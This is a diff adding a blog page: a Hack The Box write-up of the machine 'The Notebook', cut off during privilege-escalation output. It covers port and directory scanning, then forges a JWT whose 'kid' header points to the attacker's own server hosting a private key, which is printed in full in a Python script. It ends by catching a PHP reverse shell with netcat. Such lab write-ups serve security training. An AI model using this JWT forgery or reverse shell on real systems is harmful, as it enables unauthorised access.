@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>The Notebook :: Research blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="NMAP ──(kali㉿kali)-[~] └─$ nmap 10.10.10.230 -p- 130 ⨯ Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-20 12:27 EDT Not shown: 65532 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 10010/tcp filtered rxapi There is a webserver running. Lets check it out.
+It seems to just be a note taking application which we can add notes too. Lets see how the request is working by intercepting with burpsuite. While we are doing this we can get Ffuf running to see if we can find anything else on the website of interest." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://thomas-byrne.co.uk/hackthebox/the-notebook/" />
+
+
+
+
+<link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/style.css">
+
+  <link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://thomas-byrne.co.uk/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="https://thomas-byrne.co.uk/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="The Notebook :: Research blog">
+<meta property="og:description" content="Hack The Box machine" />
+<meta property="og:url" content="https://thomas-byrne.co.uk/hackthebox/the-notebook/" />
+<meta property="og:site_name" content="The Notebook" />
+
+  <meta property="og:image" content="https://thomas-byrne.co.uk/.">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-07-09 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    /home
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/hackthebox">HackTheBox</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">Show more ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/oscp">OSCP</a></li>
+              
+            
+              
+                <li><a href="/projects">Projects</a></li>
+              
+            
+              
+                <li><a href="/research">Research</a></li>
+              
+            
+              
+                <li><a href="/showcase">Showcase</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/hackthebox">HackTheBox</a></li>
+      
+    
+      
+        <li><a href="/oscp">OSCP</a></li>
+      
+    
+      
+        <li><a href="/projects">Projects</a></li>
+      
+    
+      
+        <li><a href="/research">Research</a></li>
+      
+    
+      
+        <li><a href="/showcase">Showcase</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://thomas-byrne.co.uk/hackthebox/the-notebook/">The Notebook</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-07-09 
+      </span>
+    
+    
+    <span class="post-author">:: Tom</span>
+    
+  </div>
+
+  
+
+  
+    <img src="https://thomas-byrne.co.uk/." class="post-cover" alt="The Notebook" />
+  
+
+  
+
+  <div class="post-content"><div>
+        <h2 id="nmap">NMAP<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>                                                                                 
+└─$ nmap 10.10.10.230 -p-                                                                     <span style="color:#ae81ff">130</span> ⨯ 
+Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-06-20 12:27 EDT      
+Not shown: <span style="color:#ae81ff">65532</span> closed ports
+PORT      STATE    SERVICE
+22/tcp    open     ssh
+80/tcp    open     http
+10010/tcp filtered rxapi
+
+</code></pre></div><p>There is a webserver running. Lets check it out.</p>
+<p><img src="/HackTheBox/The-Notebook/images/webserver.png" alt="webserver"></p>
+<p>It seems to just be a note taking application which we can add notes too. Lets see how the request is working by intercepting with burpsuite. While we are doing this we can get Ffuf running to see if we can find anything else on the website of interest.</p>
+<h3 id="ffuf">Ffuf<a href="#ffuf" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ffuf -u http://10.10.10.230/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt
+
+        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+
+       v1.3.1 Kali Exclusive &lt;<span style="color:#ae81ff">3</span>
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.230/FUZZ
+ :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : <span style="color:#ae81ff">10</span>
+ :: Threads          : <span style="color:#ae81ff">40</span>
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+admin                   <span style="color:#f92672">[</span>Status: 403, Size: 9, Words: 1, Lines: 1<span style="color:#f92672">]</span>
+register                <span style="color:#f92672">[</span>Status: 200, Size: 1422, Words: 193, Lines: 33<span style="color:#f92672">]</span>
+logout                  <span style="color:#f92672">[</span>Status: 302, Size: 209, Words: 22, Lines: 4<span style="color:#f92672">]</span>
+login                   <span style="color:#f92672">[</span>Status: 200, Size: 1250, Words: 173, Lines: 31<span style="color:#f92672">]</span>
+                        <span style="color:#f92672">[</span>Status: 200, Size: 1849, Words: 404, Lines: 57<span style="color:#f92672">]</span>
+
+</code></pre></div><p>fuff found a /admin endpoint however i get a 403 permission denied error when trying to visit it.</p>
+<h3 id="jwt-token-discovery">JWT token discovery<a href="#jwt-token-discovery" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p><img src="/HackTheBox/The-Notebook/images/jwt.png" alt="jwt"></p>
+<p><img src="/HackTheBox/The-Notebook/images/jwt2.png" alt="jwt2"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6InRvbSIsImVtYWlsIjoidGVzdEBnbWFpbC5jb20iLCJhZG1pbl9jYXAiOjB9.Rhu_rVBAF2vfwDaUXUdKJQvoflPtZBLmOV-3pkyZUNL8kpIN6m2dtGYJDU1IAu7Iikej5wDVU1u8heQf6pXBn3bMCJGyytgAxPS8mFqz2oOhOKproZgWj2jdAN1hl5rYrN4Otp21JJTfBvnaVmvtuHGiJyQBmFdrdvTv9FHWPTmmqDwyAkIwJ9hywWqmtWw8ZkaCps9QFdTE7g0lcNTEXaKf6UCzHNanILXdZJO0a2QluuCmF17FrWjf7OsjlHRZhu85T_cEybQIn4j-kT4wErvR-RRaE4HYrC-DWpOqaIsd7EdEuq6hfm8oawo1ZyJKgIjsjtNTKzb2McaOQF7WQDry7NorzM7XBYRA04DypLdYGOXS9Kxgn_RHUXH4-oDlU0jKRMBIog3F3vaAyZ_6r8Mv-8xgjpWp9LENYzhOuWzyBi92CSxG3gu1xCyBlb9UTvm_1NjnD-Fbh2NI6mmHEIICzp-XYSsipObBgm2wRUnw5oHd21oT-z1WPZVwIHcY5fHMkIghEn92dViUB0vKriYseoqzhq7ZGEJtalfEL-NjdC6eK1CNVjcceGZoZ9NiLc92f3R6tIPbLn3BXfSdbhnJDn6SP4tNgkquljpl5Bk4HnrQxhQ8R54BDiOHv6JPOaBVrtViHih439sOBjOzBregMT9UTXwxihequxcbUdo
+</code></pre></div><p>So we can see the application uses jwt tokens for authorisation. After decoding the jwt token we can see it passes a parameter &ldquo;admin_cap&rdquo; which probably stands for admin_capability. If we are able to generate our own jwt token, then we could change admin_cap to 1 to see if that now allows us to hit the /admin endpoint.</p>
+<p>To generate our own jwt token we will need the private key to sign the token. We can see in the header they are specifiying where the private key is located, which is on an endpoint on their local server. If we find some sort of LFI or SSRF we could download this private key and generate our own tokens.</p>
+<p>However there is another way. If jwt tokens are misconfigured then you could send a token without a valid signature and it will accept it. This is a much easier option so i want to try this first.</p>
+<p>The kid header specifies where its private key is. Why dont we create our own JWT token, changing the kid header to our IP with a file we can control since we cant get access to their private key. This way the token will be signed and it should conform to the layout needed for a &ldquo;valid&rdquo; token.</p>
+<h2 id="generating-jwt-token">Generating JWT token<a href="#generating-jwt-token" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> jwt
+
+priv_key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;&#34;-----BEGIN RSA PRIVATE KEY-----
+</span><span style="color:#e6db74">MIIJJgIBAAKCAgEA2ttKqhS2T4L8yvrS32mJVW6YklQtaGaQltjFKEvviScj33Gu
+</span><span style="color:#e6db74">/8qOIIw0mN8JeYgVAAPf2cUPUAaE+C15v5uHHc3+tBpir0UrC2wcOyQtOEWACQLW
+</span><span style="color:#e6db74">cKFjyTvNd7L/PVaHATYaE/rp64PqOXETrotjWYjSDrbqWnluq+fLkkilaJKFmjJH
+</span><span style="color:#e6db74">/qKM8HbHBdtETLMIbkB4c96oMJV7/80p2zLQRBBJeiEdrOb9VpWQJS+M8U0tCEfY
+</span><span style="color:#e6db74">0YXUVDJdUTkAE797iTnQk9/kD6coXB9171OTi/fV7cyO2mCAiq0SAKS+uqH62tUD
+</span><span style="color:#e6db74">uRCqMMqGNKT00xFnYAN6i6X7E9iVhIj9EnwO1+cGNc5J9uOZykpcnmln6G4cFo5w
+</span><span style="color:#e6db74">mphf26nwsEhgS0DOYGEp/DY4WGrrXDded360Rv1J1wRBB16uGK9B5xTnBQMewoU1
+</span><span style="color:#e6db74">MUtvdBPkc8Zb66WSMUKaIxBul26YvjXeShqKxzuTwCfomHad3r9iqZEVSvfyEwdZ
+</span><span style="color:#e6db74">sIhWQBLLTZ/jC3DBxNtyrKxhqKScMlXHSe1bhyg1yz/jbdM4Hl2un+HVKPpwjl94
+</span><span style="color:#e6db74">FFv17B+sHWiaVzfJR4pIzLZWUUhilqGMAG9pZz757gxIzEDgK++m7U71B4c4SbvU
+</span><span style="color:#e6db74">eaGpjxWLY8efyT74p28ypcb8PwnvGjmh4OUA4dNHaEKpOd8nB0h8vTpJxXcCAwEA
+</span><span style="color:#e6db74">AQKCAgAvbu/TxQFuYjlf1NT3TuxQ89Nlg5ED25bi2sCAZ1TXKQCBYSZIkiITs8+C
+</span><span style="color:#e6db74">gnSPPosuoahWjnsvIPqYv2JvwMmcEBVv+3f//MHDi/7iYojadVW2nkLTzmbOKoPx
+</span><span style="color:#e6db74">uX3QUXyZKpykT/F69fBB2twlLFiwAxNj1Qkd6sutvmNEpTIUZA1IyjUIXzqks1mX
+</span><span style="color:#e6db74">T1qSNQtSue5hTpStUvi5DEJSG8U/uzfxnFPOMZIevfOr2450jgGAlfHMF3FZfkDz
+</span><span style="color:#e6db74">ZaM6pHml2D34jsHjEpuQu9DXugl0gJaBH6Cme9vgMnqAYTRlRs4Tt69C4PXB9WL4
+</span><span style="color:#e6db74">7feR92esS5S3x5WPS5W8T+RpqTGd+tcxpltWggWa3Wu0RIEne6z0ggkWYTjq1R0d
+</span><span style="color:#e6db74">H5uviaqnYdcL2VdiQM0AXBGhNtp8++whdtdsPAlH+D1Q4JN12Ai9RvfxaEGGr8b5
+</span><span style="color:#e6db74">Dh6vWnyrN5TG7x+fHmaMZvIo2oGYXRu7ZqlAA9lZ1+d7bmsKrJkpmC96bhf38uJ1
+</span><span style="color:#e6db74">j7oz4uo9NYfSOac/ByGh4mcTgI70Cw5wA2ziXUMRpBWlQvwDcJh2wAeGqrHVH/K9
+</span><span style="color:#e6db74">8Y9e8i7B2dDtWq52Ej7ZoxjD1L+bvb6QpwXLT9F7hU9sfin4bPjnQPfpSsfCQZzO
+</span><span style="color:#e6db74">tUA68SirHeBBJUuYKdGO+7zadhiklJxIAJf9tjCAsZsAXTWQAQKCAQEA+eW16nqb
+</span><span style="color:#e6db74">ZhZcL5ZdAWxQXrEXpOT98fgti0YOHiFijEDjD63nZcAeqAbZooLATuPbe6YrQfLO
+</span><span style="color:#e6db74">ULkfOUUjnned0a2kPK7OQNRPB8R1v6wHTbZsLRxxzq1wqDTSSZr1+NIrY+n4bokZ
+</span><span style="color:#e6db74">t5OBEOWFkkPaKyzKSFs02VASaP/55UrMPCs9582+wLXx7q1biXkW0eVFmQzWpYew
+</span><span style="color:#e6db74">m0YjnCIHYRHYW7+F08tOqU61II8JCRlV7sU71RyA/HG8PBxkxh7f4cxYMALh+xQN
+</span><span style="color:#e6db74">eWRjMzwHHXGy6Dqr3Z7xQ7rn6dOfSBadh0HJeX/C5BUaE/QenZ7zqRMx2wxBdRx6
+</span><span style="color:#e6db74">UcB/R0xVZAZ/dwKCAQEA4DOF6u3osdm1a+d1q10QJrIlycvEQlp8e8+Tlt/VpgXK
+</span><span style="color:#e6db74">8+/nPrZy2umuCKzCpAhLYcEhuHwpkH0oJjrjE7wQ1ej7+Pwt1WvMkQiMGblhsNHv
+</span><span style="color:#e6db74">QOQEq2VWZD4YO5cs+Tuxa+IlsH5yU5kmgiDNYNG1lR5HWh4VpQg7dB03SPs8lwci
+</span><span style="color:#e6db74">GUIF5pkHjjK7VIrwbazRtS4XPu3Wjm4kcNGQWF5FEvpvaZs0iTDqHS2y5hOhvB3a
+</span><span style="color:#e6db74">rLAq7mEk7nvC8ajWxoEmds7+H/DdPsg2xU3QP6u6SlSOVZvvaRZt55uAZ+ieGmpx
+</span><span style="color:#e6db74">tAixnovG7UxcVYIO2RshIdAVVz8QLzU9fseMPWRqAQKCAQBoOfzDzVtfGthcKLSl
+</span><span style="color:#e6db74">0U08EVSxO6kG8OHeAtwEiRwXL0EE2x11/MlMf37qHuqifLqgOdA081ZFqNBzDHks
+</span><span style="color:#e6db74">sOsr9uZXQPlZZLOJo9EQnml1ai54KjL1ZrVkEpPaiz0oCFB8nas2Pwxw2p6sM26g
+</span><span style="color:#e6db74">cJhgBZBg2VmTgagMDydlEOtZ9RcexVtX+Qrs53UUQ2LXLG74xLgJ1iw8tuZHSpIV
+</span><span style="color:#e6db74">VGIO8jSY/2TRjLhS2hWErAKBUdYArqDFqZI+6ADH+TybaqUlcS5bkCOGi+4sAk9d
+</span><span style="color:#e6db74">YnyiC0Z/arlp7Fyp08/NO1F8hl3HxRe+FWcJB3p1d0RdMlpK6DOs6rHBwy3SyO2c
+</span><span style="color:#e6db74">iHFFAoH/RvAGb07XUW6Q+JNDp/TKJ3Q2gKL4dgYrXQFQsWwhLWan0IcXo8AWly1Y
+</span><span style="color:#e6db74">42XGMCBvuX5iLP0cKZtwGKiJMLVQnl4ZW65u0hhJoZoSuhDt2ASUrvN2hsSJkS4U
+</span><span style="color:#e6db74">fMZYdINun7PuOOnJQqoyhPncAcZYrdXmvZzHPHBeX17fHzhe82pOX6+ELnI88cEb
+</span><span style="color:#e6db74">hKRxbkJAGBN9R2v5dxdicE/eXBd3w4l5tvBkrwPLD3BmKmYLxnmrtvgGnWYfSVXf
+</span><span style="color:#e6db74">WJcTXbt/cBgOUAzl8/dlXQhB2+N6Dgqy/mNYXOe73oxVFIuFetYzI8Ocb43KY0rF
+</span><span style="color:#e6db74">7Eg6ancrBIfSOMi7VjSCQJrixIoBAoIBAQDaEeKtMr2Bu6G2Bufc5etbnPAV7xGa
+</span><span style="color:#e6db74">svCK/65/czRL0o17EV1WmKFuhc4hoHDNSLaXGOWNrIzqwupcPlQ5fNI4hznJQgOv
+</span><span style="color:#e6db74">vvYUpJDzQeLQ3Q0SkyKJvziGaMYLA4Bm2kZZJhowIOb2WFmAc5y9DsOOfRdfV6cF
+</span><span style="color:#e6db74">dgiRJLmRwDAcQWLhxvW77hoHnAOHJBvldI4Xtjful6UkLhQHqwgIY+5Y9Gzjwg1d
+</span><span style="color:#e6db74">6DFcnWgU5OEiamxogMHnAXbXekVEszxoRsAvjvltUU7CdBKI34i03/k6OBf9EOJh
+</span><span style="color:#e6db74">dogEhSI5b5ABktd1PzIP4p6PVHi7hFzcyXWQO/TSp+pj+vZbxsdfroDP
+</span><span style="color:#e6db74">-----END RSA PRIVATE KEY-----
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+public_key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;&#34;-----BEGIN PUBLIC KEY-----
+</span><span style="color:#e6db74">MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA2ttKqhS2T4L8yvrS32mJ
+</span><span style="color:#e6db74">VW6YklQtaGaQltjFKEvviScj33Gu/8qOIIw0mN8JeYgVAAPf2cUPUAaE+C15v5uH
+</span><span style="color:#e6db74">Hc3+tBpir0UrC2wcOyQtOEWACQLWcKFjyTvNd7L/PVaHATYaE/rp64PqOXETrotj
+</span><span style="color:#e6db74">WYjSDrbqWnluq+fLkkilaJKFmjJH/qKM8HbHBdtETLMIbkB4c96oMJV7/80p2zLQ
+</span><span style="color:#e6db74">RBBJeiEdrOb9VpWQJS+M8U0tCEfY0YXUVDJdUTkAE797iTnQk9/kD6coXB9171OT
+</span><span style="color:#e6db74">i/fV7cyO2mCAiq0SAKS+uqH62tUDuRCqMMqGNKT00xFnYAN6i6X7E9iVhIj9EnwO
+</span><span style="color:#e6db74">1+cGNc5J9uOZykpcnmln6G4cFo5wmphf26nwsEhgS0DOYGEp/DY4WGrrXDded360
+</span><span style="color:#e6db74">Rv1J1wRBB16uGK9B5xTnBQMewoU1MUtvdBPkc8Zb66WSMUKaIxBul26YvjXeShqK
+</span><span style="color:#e6db74">xzuTwCfomHad3r9iqZEVSvfyEwdZsIhWQBLLTZ/jC3DBxNtyrKxhqKScMlXHSe1b
+</span><span style="color:#e6db74">hyg1yz/jbdM4Hl2un+HVKPpwjl94FFv17B+sHWiaVzfJR4pIzLZWUUhilqGMAG9p
+</span><span style="color:#e6db74">Zz757gxIzEDgK++m7U71B4c4SbvUeaGpjxWLY8efyT74p28ypcb8PwnvGjmh4OUA
+</span><span style="color:#e6db74">4dNHaEKpOd8nB0h8vTpJxXcCAwEAAQ==
+</span><span style="color:#e6db74">-----END PUBLIC KEY-----
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+jwt_token <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>encode({<span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;tom&#34;</span>,<span style="color:#e6db74">&#34;email&#34;</span>:<span style="color:#e6db74">&#34;test@gmail.com&#34;</span>,<span style="color:#e6db74">&#34;admin_cap&#34;</span>:<span style="color:#ae81ff">1</span>}, priv_key, algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;RS256&#39;</span>, heaheaders<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;kid&#34;</span>:<span style="color:#e6db74">&#34;http://10.10.16.24:7070/privKey.key&#34;</span>},)
+
+print(jwt_token)
+
+
+</code></pre></div><p>I have taken the token from earlier altering the &ldquo;admin_cap&rdquo; (from 0 to 1) and the &ldquo;kid&rdquo; parameters to give me the elevated permissions to access the /admin page.</p>
+<p>I am using pyjwt to then sign and encode the token into the correct base64 format. This was a pain as it was really picky on the certificate used and the format of it in the code.</p>
+<p>If i run this we can see the final token that is produced. I need to add this to the browser and it should work.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/Thenotebook<span style="color:#f92672">]</span>                                                               
+└─$ python3 test.py                                                                                                
+eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNi4yNDo3MDcwL3ByaXZLZXkua2V5In0.eyJ1c2VybmFtZSI6InR
+vbSIsImVtYWlsIjoidGVzdEBnbWFpbC5jb20iLCJhZG1pbl9jYXAiOjF9.wyZPCFhApxFhpcLFJVsSJ3QkCdaCxluFioJCj8E02Ljk7H65-NSD1yTR0Ue48zj1gdFTBS4La0qy8nkiXmldkIY9KUNLfu218snRCHOWwApZay010WOlE5piASr3BtoJXvQxZO3uKHF0Pw8xdT3iI6N7nBU3YKCPSbX7nKoZ47NE-RJza5EZMAmXCs6-5NJZIUhLxCCqCavkw_xFhHq_0aBFmK5QCJ12kSKSFnXbxKeC3JV_3QWrqjdLc2yhXmJpRjqJfCF4ndmP97W4KU6ziqyts3JDLxUIjX1RZwXjx3a2qEDqS_DamfcwvuRt7sVqMu5b_KRniRMIMPgrekAAGimPDl5zYViqyCyLGXsrC3-jj4golWZTGjy7KyoF0JyJdA6B8Nihu2popqxij1kpUW9hAdHMsBUqE76Og0zOlmjbyveL3T3LQAarCQXqk_jLuacgLDStbuTFQbFRfW0-CiGDsMEU88DUXrA0CYUDqXxR-N0Ln3Z33R7kDdMcMcd1TM-mfiV3J5m8boSrTODCGauQvoynW_w9cHz-ytV66Xbmx0WDETKyZF_wzl7uidhZDSb7wk-I8mqnJxt9gWrkvERGpJ4xwN0zkizG8R-ROutLFZIG0DhJ5xmQFXlSR18NoNyJkPEaM4RcD5a_xWuR5hwLPIrD9ZPpzEqxTZvu3Z4  
+</code></pre></div><p>I had to sign this token using a private key. To ensure the signature is valid in my token the server will need to download my prviate key to perform a check. Currently the server has its own signed token with its own private key located at http://127.0.0.1:7070/privKey.key. I changed this to my ip address (10.10.16.24:7070/privKey.key) where i was storing my own private key. Once i try and hit the /admin page the server will download my private key from my webserver to check my signature is valid.</p>
+<p>If i add the token to my browser we can see this is exactly what happens by taking a look at the logs of my webserver.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/Thenotebook<span style="color:#f92672">]</span>
+└─$ sudo python3 -m http.server <span style="color:#ae81ff">7070</span>
+Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">7070</span> <span style="color:#f92672">(</span>http://0.0.0.0:7070/<span style="color:#f92672">)</span> ...
+10.10.10.230 - - <span style="color:#f92672">[</span>20/Jun/2021 18:04:42<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /privKey.key HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
+
+</code></pre></div><p><img src="/HackTheBox/The-Notebook/images/adminpanel.png" alt="adminpanel"></p>
+<p>I have added in the token and now i can access the admin panel!</p>
+<p>Here is an overview of everything so far. The token was generated in the bottom left, i added this to my browser and hit the admin panel, which the server then downloaded my private key to check the signature.</p>
+<h2 id="getting-foothold">Getting foothold<a href="#getting-foothold" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>On the Admin panel it looks like we can upload files. Lets see if we can get a reverse shell.</p>
+<p><img src="/HackTheBox/The-Notebook/images/fileupload.png" alt="fileupload"></p>
+<p>Easy shell, i was able to just upload a simple php reverse shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents<span style="color:#f92672">]</span>
+└─$ nc -nvlp <span style="color:#ae81ff">1234</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1234</span> ...
+connect to <span style="color:#f92672">[</span>10.10.16.24<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.230<span style="color:#f92672">]</span> <span style="color:#ae81ff">36608</span>
+Linux thenotebook 4.15.0-135-generic <span style="color:#75715e">#139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
+ 22:56:05 up  1:41,  <span style="color:#ae81ff">0</span> users,  load average: 0.12, 0.04, 0.01
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+/bin/sh: 0: can<span style="color:#960050;background-color:#1e0010">&#39;</span>t access tty; job control turned off
+$ id 
+uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+$ uname -a
+Linux thenotebook 4.15.0-135-generic <span style="color:#75715e">#139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
+$ 
+
+</code></pre></div><p><img src="/HackTheBox/The-Notebook/images/shell.png" alt="shell"></p>
+<h2 id="privilege-escalation">Privilege escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I ran linpeas and found it was running Sudo version 1.8.21p2.</p>
+<p>Looks as though it has picked up a db file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Searching tables inside readable .db/.sql/.sqlite files <span style="color:#f92672">(</span>limit 100<span style="color:#f92672">)</span>                                   
+Found: /var/lib/mlocate/mlocate.db: regular file, no read permission   
+</code></pre></div><p>Other files of interest</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╔══════════╣ Modified interesting files in the last 5mins <span style="color:#f92672">(</span>limit 100<span style="color:#f92672">)</span>                                              
+/tmp/home.tar.gz                                                                                                   
+/var/log/syslog                                                                                                    
+/var/log/auth.log                                                                                                  
+/var/log/nginx/error.log                                                                                           
+/var/log/nginx/access.log                                                                                          
+/var/log/vmware-vmsvc-root.log                                                                                     
+/var/www/.viminfo                                                                                                  
+/var/www/.gnupg/trustdb.gpg                                                                                        
+/var/www/.gnupg/pubring.kbx                                                                                        
+/var/www/.config/lxc/config.yml   
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╔══════════╣ Analizing Interesting logs Files <span style="color:#f92672">(</span>limit 70<span style="color:#f92672">)</span>                                                           
+-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">2048864</span> Jun <span style="color:#ae81ff">20</span> 23:14 /var/log/nginx/access.log                           
+-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">13313</span> Jun <span style="color:#ae81ff">20</span> 23:14 /var/log/nginx/error.log  
